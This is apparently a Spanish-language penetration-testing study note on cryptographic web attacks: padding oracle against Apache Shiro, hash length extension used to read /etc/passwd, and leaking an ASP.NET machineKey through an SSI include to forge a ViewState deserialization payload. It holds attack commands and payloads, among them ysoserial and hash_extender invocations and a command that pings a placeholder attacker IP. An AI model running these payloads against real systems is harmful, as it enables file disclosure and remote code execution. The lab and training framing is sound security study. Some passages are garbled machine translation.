# crypto attacks

* Padding Oracle Attack
* Hash Length Extension Attack
* Leveraging machineKey
* Subverting HMAC in Node.js

### Que es Padding Oracle Attack

En una aplicación web, un Oracle es cualquier funcionalidad de la aplicación, mensaje de error o comportamiento que puede revelar información valiosa

* https://robertheaton.com/2013/07/29/padding-oracle-attack/
* Este ataque aprovecha el relleno adecuado e incorrecto como medio para obtener información de la aplicación

Funciones de descifrado en modo CBC que funcionan con relleno en modo PLCS7

* http://seffyvon.github.io/cryptography/2014/08/20/CBC-Padding-Oracle-Attacks/
* Un oráculo de relleno puede revelar si el relleno es correcto para un texto cifrado dado.

Otro recurso:

* http://netifera.com/research/poet/PaddingOracleBHEU10.pdf

#### Valores intermedios <a href="#intermediate-values" id="intermediate-values"></a>

Son la salida del cifrado de bloques durante el proceso de cifrado de bloques

Esencialmente, se pueden ver como el estado de un bloque de texto cifrado después del descifrado y antes de la operación XOR con el bloque de texto cifrado anterior

Una vez que se encuentran los bytes intermedios, descifrar el texto plano del texto cifrado correspondiente es fácil

### Escenario de ataque de Padding Oracle <a href="#padding-oracle-attack-scenario" id="padding-oracle-attack-scenario"></a>

Escenario de ataque contra Apache Shiro

Apache Shiro es un marco de seguridad de Java que tiene funciones para realizar la autenticación, la autorización, la contraseña y la gestión de sesiones.

* Las versiones anteriores de Shiro sufrían de una vulnerabilidad de relleno de Oracle que, cuando se encadenaba con otra vulnerabilidad basada en la deserialización, podía dar lugar a RCE
* Shiro utilizó el modo AES-128-CBC para cifrar las cookies que permitían los ataques de Padding Oracle.

Además:

* https://www.anquanke.com/post/id/192819

#### Creación de un entorno vulnerable <a href="#creating-vulnerable-environment" id="creating-vulnerable-environment"></a>

Hemos configurado nuestro propio entorno vuln usando Apache Shiro 1.4.1 + tomcat:8-jre8

```
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.4.1
mvn install
cd samples/web
mvn install
```

Copie el paquete samples-web-1.4.1.war (samples/target) obtenido después de la compilación en el directorio Tomcat webapps

```
start tomcat
```

#### El ataque <a href="#the-attack" id="the-attack"></a>

1 - Agarra la galleta con ERUCTO

2 - Cree una carga útil serializada con YsoSerial:

```
java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "touch /tmp/Success" > payload.class
```

3 - Descargue el exploit disponible públicamente:

```
https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
# use to captures the 'remember me' cookie as a prefix For the Padding Oracle attack
```

4 - Después de un par de horas, el script de explotación nos proporcionó una cookie válida que contenía nuestra carga útil. Esta cookie será deserializada por el servidor vuln

5 - Utilice el repetidor BURP para emitir una solicitud sin cookie elaborada.

> Los ataques de oráculo de relleno son ataques de texto cifrado elegido (CCA)

### Fundamentos <a href="#fundamentals" id="fundamentals"></a>

Hay aplicaciones web que anteponen un valor secreto a los datos, hash de este valor con un algoritmo defectuoso y proporcionan al usuario tanto los datos como el hash, pero no el secreto

```
# On other part of the communication, the server relies on the secret For data validation purposes
# An attacker that does not know the value of the secret can still generate a valid hash For 
{secret || data || attacker_controlled_data}.

# An attacker can calculate a valid hash For a message without knowing the value of the secret. 
# He can do that by just guessing its length. Hashes are calculated in blocks and the hash of one block is the state For the next block.
```

Ejemplo

Pedir:

```
stock_quantity=20&price=1000
```

Picadillo:

```
[secretpass|stock_quantity=20&price=1000|padding] => Hash1/State1
```

Solicitud final:

```
stock_quantity=20&price=1000&hash=Hash1
```

> Si un atacante logra identificar la longitud del relleno, tendrá toda la información necesaria para calcular un nuevo hash.

Hash de ataque:

```
[secretpass|stock_quantity=20&price=1000|padding|&price=100]
```

Hash de ataque:

```
[State1|&price=10]=>Hash2/State2
```

Solicitud final:

```
stock_quantity=20&price=1000+padding&price=100&hash=Hash2
```

Además, los cálculos requeridos durante los ataques de extensión de longitud de hash:

```
https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
```

### Escenario de extensión de longitud de hash <a href="#hash-length-extension-scenario" id="hash-length-extension-scenario"></a>

* https://github.com/SpiderLabs/CryptOMG

El desafío 5 es lo que necesitamos para presenciar cómo se puede realizar una extensión de longitud de hash

Intentemos leer el contenido de /etc/passwd ejecutando el ataque

No necesitamos saber el valor secreto que se está utilizando. Solo necesitamos adivinar con éxito la longitud del secreto.

Para esta tarea podemos utilizar **hash\_extender**:

```
#  https://github.com/iagox86/hash_extender
# The specify a known hash value
# The specify an estimation regarding the secrets length (between 10 and 40 bytes)
# We will have to experiment with the amount of ../../ to be used

./hash_extender -f sha1 --data 'test' -s <hash> --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
```

* Ahora use el payloads.out dentro del BURP Intruder
* seguiremos un enfoque de francotirador

> Eventualmente, somos capaces de ver el contenido de /etc/passwd por medio de un ataque de extensión de longitud de hash.

![[Pasted image 20240311155923.png]]

### La importancia de machineKey <a href="#the-importance-of-machinekey" id="the-importance-of-machinekey"></a>

* https://msdn.microsoft.com/en-us/data/w8h3skw9(v=vs.110)

Es una característica que se utiliza para especificar la configuración de cifrado para los servicios de aplicaciones, como el estado de vista, la autenticación de formularios y los roles en un sistema.

* La clave de máquina contiene un conjunto de campos como la clave de validación, la clave de descifrado, etc., donde se deben introducir claves únicas.

![[Pasted image 20240311155935.png]]

![[Pasted image 20240311155954.png]]

#### Aprovechamiento de una machineKey filtrada para RCE <a href="#leveraging-a-leaked-machinekey-for-rce" id="leveraging-a-leaked-machinekey-for-rce"></a>

Escenario, estamos haciendo pruebas de penetración de una aplicación .NET

1. La aplicación ofrece funcionalidad de carga de archivos (las extensiones 'aspx', '.config', '.ashx', '.asmx', 'aspq', '.axd', '.cshtml', '.cshtml', '.rem', '.soap', '.vbhtm', '.vbhtml', '.asa', '.asp' y '.cer' están en la lista negra.
2. Se realiza la validación de la MAC de estado de vista (esto evita la explotación de la deserialización sin conocer la clave criptográfica: machineKey)

> Nuestro único cambio es encontrar la llave de la **máquina**

Podemos intentar cargar lo siguiente, en un intento de filtrar la clave de la máquina:

```
<!--#include file="..\..\web.config" -->
// test.shtml
```

Si lo intentamos con éxito, podemos abrir el código fuente de la vista para recuperar su contenido

Ahora tenemos que averiguar cómo se generó y verificó la MAC:

```
- https://referencesource.microsoft.com/#system.web/UI/ObjectStateFormatter.cs
- https://referencesource.microsoft.com/#System.Web/Configuration/MachineKeySection.cs
```

Si lees lo anterior, llegarás a la siguiente lógica:

```
- MAC_HASH = MD5(serialized_data_binary + validation_key + 0x00000000)
- VIEWSTATE = Base64_Encode(serialized_data_binary + MAC_HASH)
```

#### Explotación <a href="#exploitation" id="exploitation"></a>

Necesitamos el **YsoSerial.net** e implementar la lógica relacionada con MAC de la información anterior

```
ysoserial.exe -o base64 -g TypeConfuDelegate -f ObjectStateformatter -c "cmd /c ping <attacker ip>"
```

![[Pasted image 20240311160047.png]]
> En este caso, no atacamos a las criptomonedas per se. En su lugar, aprovechamos la función SSI del servidor subyacente para filtrar la clave criptográfica

> La implementación de criptomonedas sólidas es importante, pero la protección de la clave criptográfica es igualmente importante.

### Subversión del escenario HMAC <a href="#subverting-hmac-scenario" id="subverting-hmac-scenario"></a>

Ejemplo de HMAC se puede subvertir a través de la divulgación de memoria remota en Node.js

Se proporcionará el código fuente de la aplicación vuln, para que podamos probar el ataque localmente

```
- https://en.wikipedia.org/wiki/HMAC
```

\
